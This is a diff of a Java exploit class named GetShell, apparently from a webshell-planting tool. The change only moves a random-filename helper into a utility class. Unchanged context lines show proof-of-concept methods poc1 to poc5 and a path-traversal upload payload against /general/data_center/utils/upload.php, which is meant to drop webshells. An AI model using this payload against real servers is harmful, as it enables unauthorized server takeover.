@@ -4,7 +4,6 @@ import com.xinyu.tools.Other;
 import com.xinyu.tools.Request;
 import com.xinyu.tools.Response;
 
-import java.util.Random;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
@@ -28,7 +27,7 @@ public class GetShell {
 
     public static String poc1(String url, String cookie) {
         String shell_url = null; //记录WebShell地址及密码
-        String random_filename = getRandomFileName(); //获取一个随机文件名
+        String random_filename = Other.getRandomFileName(); //获取一个随机文件名
         String payload = "/general/data_center/utils/upload.php?action=upload&filetype=nmsl&repkid=/.%3C%3E./.%3C%3E./.%3C%3E./";
 
         //创建StringBuilder对象
@@ -55,7 +54,7 @@ public class GetShell {
 
     public static String poc2(String url, String cookie) {
         String shell_url = null; //记录WebShell地址及密码
-        String random_filename = getRandomFileName(); //获取一个随机文件名
+        String random_filename = Other.getRandomFileName(); //获取一个随机文件名
         String web_root = null;
 
         //获取WEB根目录
@@ -97,7 +96,7 @@ public class GetShell {
 
     public static String poc3(String url, String cookie) {
         String shell_url = null; //记录WebShell地址及密码
-        String random_filename = getRandomFileName(); //获取一个随机文件名
+        String random_filename = Other.getRandomFileName(); //获取一个随机文件名
         String web_root = null;
 
         //获取WEB根目录
@@ -135,21 +134,21 @@ public class GetShell {
     }
 
 
-    /**
-     * 生成随机文件名
-     *
-     * @return 返回一个7位数的随机字符串
-     */
-    public static String getRandomFileName() {
-        String str = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
-        Random random = new Random();
-        StringBuffer sb = new StringBuffer();
-        for (int i = 0; i < 7; i++) {
-            int number = random.nextInt(62);
-            sb.append(str.charAt(number));
-        }
-        return sb.toString();
-    }
+//    /**
+//     * 生成随机文件名
+//     *
+//     * @return 返回一个7位数的随机字符串
+//     */
+//    public static String getRandomFileName() {
+//        String str = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+//        Random random = new Random();
+//        StringBuffer sb = new StringBuffer();
+//        for (int i = 0; i < 7; i++) {
+//            int number = random.nextInt(62);
+//            sb.append(str.charAt(number));
+//        }
+//        return sb.toString();
+//    }
 
 
     /**
@@ -159,7 +158,7 @@ public class GetShell {
      * @return
      */
     public static String[] poc4(String url) {
-        String random_filename = getRandomFileName();
+        String random_filename = Other.getRandomFileName();
 
         //上传
         StringBuilder tempParams = new StringBuilder();
@@ -219,7 +218,7 @@ public class GetShell {
      */
     public static void poc5(String url) {
         String shell_url = null; //记录WebShell地址及密码
-        String random_filename = getRandomFileName(); //获取一个随机文件名
+        String random_filename = Other.getRandomFileName(); //获取一个随机文件名
         String payload = "/general/data_center/utils/upload.php?action=upload&filetype=nmsl&repkid=/.%3C%3E./.%3C%3E./.%3C%3E./";
 
         //创建StringBuilder对象
